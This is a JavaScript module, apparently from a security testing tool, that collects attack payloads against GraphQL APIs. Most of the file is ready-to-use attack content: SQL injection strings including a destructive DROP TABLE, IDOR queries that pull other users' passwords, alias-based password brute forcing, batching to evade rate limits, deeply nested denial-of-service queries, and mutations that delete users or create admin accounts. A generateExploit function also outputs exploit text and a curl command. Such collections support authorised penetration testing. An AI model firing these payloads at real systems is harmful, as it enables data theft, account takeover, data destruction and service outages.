// GraphQL API Vulnerability Payloads
// Comprehensive payload database for GraphQL security testing

const GraphQLPayloads = {
    // Introspection queries
    introspection: [
        {
            query: `{__schema{types{name,fields{name,args{name,type{name}}}}}}`,
            description: 'Full schema introspection'
        },
        {
            query: `{__schema{queryType{name}mutationType{name}subscriptionType{name}}}`,
            description: 'Root types discovery'
        },
        {
            query: `{__type(name:"Query"){name,fields{name,type{name,kind}}}}`,
            description: 'Query type inspection'
        },
        {
            query: `{__schema{directives{name,description,locations}}}`,
            description: 'Directives discovery'
        }
    ],

    // Introspection bypass
    introspectionBypass: [
        { query: `{__schema}`, description: 'Simple __schema' },
        { query: `query{__schema{types{name}}}`, description: 'Named query' },
        { query: `{__type(name:"User"){fields{name}}}`, description: 'Direct type query' },
        { query: `{\n__schema{\ntypes{\nname\n}\n}\n}`, description: 'Newlines bypass' },
        { query: `{__Schema{types{name}}}`, description: 'Case variation' }
    ],

    // SQL Injection in GraphQL
    sqlInjection: [
        { arg: `1' OR '1'='1`, description: 'Classic SQLi' },
        { arg: `1" OR "1"="1`, description: 'Double quote SQLi' },
        { arg: `1' UNION SELECT NULL--`, description: 'UNION SQLi' },
        { arg: `1'; DROP TABLE users--`, description: 'Destructive SQLi' }
    ],

    // IDOR / Authorization bypass
    idor: [
        { query: `{user(id:1){id,username,email,password}}`, description: 'Access user 1' },
        { query: `{user(id:2){id,username,email,password}}`, description: 'Access user 2' },
        { query: `{users{id,username,email,role}}`, description: 'Enumerate all users' },
        { query: `{adminUser{id,username,secretData}}`, description: 'Access admin data' }
    ],

    // Batching attacks
    batching: [
        {
            query: `[{"query":"{user(id:1){password}}"},{"query":"{user(id:2){password}}"}]`,
            description: 'Batch multiple queries'
        },
        {
            query: `{a:user(id:1){password},b:user(id:2){password},c:user(id:3){password}}`,
            description: 'Aliases for enumeration'
        }
    ],

    // Brute force via aliases
    bruteForce: [
        {
            query: `{
                attempt0:login(username:"admin",password:"password"){token}
                attempt1:login(username:"admin",password:"admin"){token}
                attempt2:login(username:"admin",password:"123456"){token}
            }`,
            description: 'Password brute force'
        }
    ],

    // DoS attacks
    dos: [
        {
            query: `{users{posts{comments{author{posts{comments{author{username}}}}}}}}`,
            description: 'Deeply nested query'
        },
        {
            query: `{__schema{types{fields{type{fields{type{fields{type{name}}}}}}}}}`,
            description: 'Deep introspection'
        }
    ],

    // Field suggestions exploitation
    fieldSuggestions: [
        { query: `{user{passwor}}`, description: 'Typo for suggestions' },
        { query: `{user{secre}}`, description: 'Partial field name' },
        { query: `{user{admin}}`, description: 'Guess admin fields' }
    ],

    // Mutation attacks
    mutations: [
        {
            query: `mutation{deleteUser(id:1){success}}`,
            description: 'Delete user mutation'
        },
        {
            query: `mutation{updateUser(id:1,role:"admin"){id,role}}`,
            description: 'Privilege escalation'
        },
        {
            query: `mutation{createUser(username:"attacker",role:"admin"){id}}`,
            description: 'Create admin user'
        }
    ],

    // Common endpoints
    endpoints: [
        '/graphql',
        '/graphiql',
        '/api/graphql',
        '/api/v1/graphql',
        '/v1/graphql',
        '/graph',
        '/query',
        '/gql'
    ]
};

// Test types
const GraphQLTests = {
    introspection: {
        name: 'Introspection Enabled',
        description: 'Schema exposed via introspection',
        severity: 'MEDIUM'
    },
    injection: {
        name: 'GraphQL Injection',
        description: 'SQL/NoSQL injection via arguments',
        severity: 'CRITICAL'
    },
    idor: {
        name: 'IDOR / Broken Access',
        description: 'Access other users data',
        severity: 'HIGH'
    },
    batching: {
        name: 'Query Batching',
        description: 'Bypass rate limits via batching',
        severity: 'MEDIUM'
    },
    dos: {
        name: 'DoS via Nested Queries',
        description: 'Resource exhaustion attack',
        severity: 'MEDIUM'
    }
};

// Helper functions
function getIntrospectionPayloads() {
    return GraphQLPayloads.introspection;
}

function getIntrospectionBypassPayloads() {
    return GraphQLPayloads.introspectionBypass;
}

function getIDORPayloads() {
    return GraphQLPayloads.idor;
}

function getBatchingPayloads() {
    return GraphQLPayloads.batching;
}

function getMutationPayloads() {
    return GraphQLPayloads.mutations;
}

function getPayloadCount() {
    return GraphQLPayloads.introspection.length +
        GraphQLPayloads.introspectionBypass.length +
        GraphQLPayloads.sqlInjection.length +
        GraphQLPayloads.idor.length +
        GraphQLPayloads.batching.length +
        GraphQLPayloads.dos.length +
        GraphQLPayloads.mutations.length;
}

function generateExploit(type) {
    switch (type) {
        case 'introspection':
            return `# GraphQL Introspection Query

# Full schema dump
{
  __schema {
    types {
      name
      fields {
        name
        args { name type { name } }
        type { name kind }
      }
    }
  }
}

# Find sensitive types
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}

# Curl command
curl -X POST https://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'`;

        case 'idor':
            return `# GraphQL IDOR / Authorization Bypass

# Access another user's data
{
  user(id: 2) {
    id
    username
    email
    password
    role
  }
}

# Enumerate all users
{
  users {
    id
    username
    email
    role
  }
}

# Access admin-only fields
{
  user(id: 1) {
    secretApiKey
    adminNotes
  }
}`;

        case 'batching':
            return `# GraphQL Batching Attack

# Brute force via aliases (single request)
{
  attempt0: login(user:"admin", pass:"password") { token }
  attempt1: login(user:"admin", pass:"admin") { token }
  attempt2: login(user:"admin", pass:"123456") { token }
  attempt3: login(user:"admin", pass:"qwerty") { token }
}

# Array batching
[
  {"query": "{user(id:1){password}}"},
  {"query": "{user(id:2){password}}"},
  {"query": "{user(id:3){password}}"}
]

# Bypasses rate limiting per request`;

        case 'dos':
            return `# GraphQL DoS via Nested Queries

# Deeply nested query (exponential complexity)
{
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}

# Mitigation: Query depth limiting, complexity analysis`;

        default:
            return '';
    }
}

function buildGraphQLRequest(query, variables = {}) {
    return JSON.stringify({
        query: query,
        variables: variables
    });
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        GraphQLPayloads,
        GraphQLTests,
        getIntrospectionPayloads,
        getIntrospectionBypassPayloads,
        getIDORPayloads,
        getBatchingPayloads,
        getMutationPayloads,
        getPayloadCount,
        generateExploit,
        buildGraphQLRequest
    };
}
